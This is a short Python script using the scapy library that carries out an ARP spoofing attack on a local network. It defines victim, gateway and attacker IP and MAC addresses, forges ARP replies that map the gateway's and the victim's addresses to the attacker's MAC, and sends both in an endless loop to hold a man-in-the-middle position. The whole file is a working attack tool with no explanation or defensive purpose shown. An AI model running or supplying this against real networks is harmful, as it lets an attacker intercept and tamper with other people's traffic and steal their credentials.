from scapy.all import *
# IP addresses
victim_ip = "192.168.1.18"
gateway_ip = "192.168.1.1"
attacker_ip = "192.168.1.19"

# MAC addresses
gateway_mac = "00:0c:29:62:1b:1f"
attacker_mac = "00:0c:29:2d:6f:18"
victim_mac = "00:0c:29:f2:0a:8b"


# Define ARP packet with updated MAC address
arp_packet_to_victim = Ether(dst=victim_mac)/ARP(op = 2, psrc = gateway_ip, hwsrc=attacker_mac)
arp_packet_to_gateway = Ether(dst=gateway_mac)/ARP(op = 2, psrc = victim_ip, hwsrc=attacker_mac)

# Send ARP packets continuously
while 1:
    sendp(arp_packet_to_victim)
    sendp(arp_packet_to_gateway)
    time.sleep(1)